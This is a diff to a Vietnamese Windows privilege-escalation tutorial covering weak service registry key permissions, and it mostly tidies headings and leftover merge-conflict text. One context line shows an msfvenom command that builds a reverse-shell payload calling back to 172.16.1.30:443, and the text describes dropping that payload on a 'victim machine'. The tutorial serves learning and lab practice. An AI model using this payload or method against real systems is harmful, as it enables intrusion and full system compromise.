@@ -2,7 +2,9 @@
 
 Khi liệt kê các quyền của khóa đăng ký yếu, mục tiêu của tôi là tìm các quyền yếu trên subkeys trong HKLM\SYSTEM\CurrentControlSet\Services registry key. Đây là registry key được liên kết với tất cả các dịch vụ có trên hệ thống
 
-# Săn lùng các quyền của khóa đăng ký yếu: accesschk.exe(Thuộc bộ công cụ Sysinterals)
+# Săn lùng các quyền của khóa đăng ký yếu: 
+
+accesschk.exe(Thuộc bộ công cụ Sysinterals)
 
 Link tải: https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite
 sau khi tải xuống ta có 2 bản là bản 64 và 32 bit
@@ -77,8 +79,8 @@ Sau khi thực thi winPEAS, tôi sẽ tìm thấy mọi khóa đăng ký dịch 
 
 Sau khi đã tìm được khóa ta bằng đầu khai thác
 
-Liệt kê khóa đăng ký dịch vụ yếu mà tôi tìm thấy
-=======
+# Liệt kê khóa đăng ký dịch vụ yếu mà tôi tìm thấy
+
 ![image-10](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/82a7cd5a-c566-4c5e-b84a-67b07268ea40)
 
 Sau khi thực thi winPEAS, chúng tôi sẽ tìm thấy mọi khóa đăng ký dịch vụ bị định cấu hình sai trong phần Thông tin dịch vụ .
@@ -121,8 +123,8 @@ Vì tôi có quyền sửa đổi khóa đăng ký nên tôi có thể thay đ�
 
 Do dịch vụ này tự động khởi động nên tôi sẽ cần kích hoạt một sự kiện để khởi động lại dịch vụ hoặc cố gắng dừng rồi khởi động lại. Thật may mắn cho tôi, trước đó tôi đã thấy rằng người dùng chuẩn của tôi có SeShutdownPrivilege, nghĩa là tôi có thể khởi động lại hệ thống để buộc dịch vụ khởi động lại.
 
-Khai thác khóa đăng ký dịch vụ yếu mà tôi tìm thấy
-=======
+# Khai thác khóa đăng ký dịch vụ yếu mà tôi tìm thấy
+
 Do dịch vụ này tự động khởi động nên chúng tôi sẽ cần kích hoạt một sự kiện để khởi động lại dịch vụ hoặc cố gắng dừng rồi khởi động lại. Thật may mắn cho chúng tôi, trước đó chúng tôi đã thấy rằng người dùng chuẩn của chúng tôi có SeShutdownPrivilege, nghĩa là chúng tôi có thể khởi động lại hệ thống để buộc dịch vụ khởi động lại.
 ![image-27](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/4e4ac5a1-1c0b-4090-997c-3f0263a93c3a)
 
@@ -138,9 +140,8 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.1.30 LPORT=443 -a x64 --p
 ```
 ![image-17](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/29c48bba-dca2-44e2-87c4-296bbd7c1e02)
 
-
 Khi tệp thực thi đã sẵn sàng hoạt động, tôi cần chuyển nó sang máy nạn nhân. Vì chia sẻ vẫn đang mở nên hãy sử dụng nó.
-=======
+
 Khi tệp thực thi đã sẵn sàng hoạt động, chúng tôi cần chuyển nó sang máy nạn nhân. Vì chia sẻ vẫn đang mở nên hãy sử dụng nó.
 ![image-18](https://github.com/Manh130902/Windows-Privilege-Escalation/assets/93723285/eacdcb4c-d7d2-49f7-9396-5c0bce1ac6b3)
 
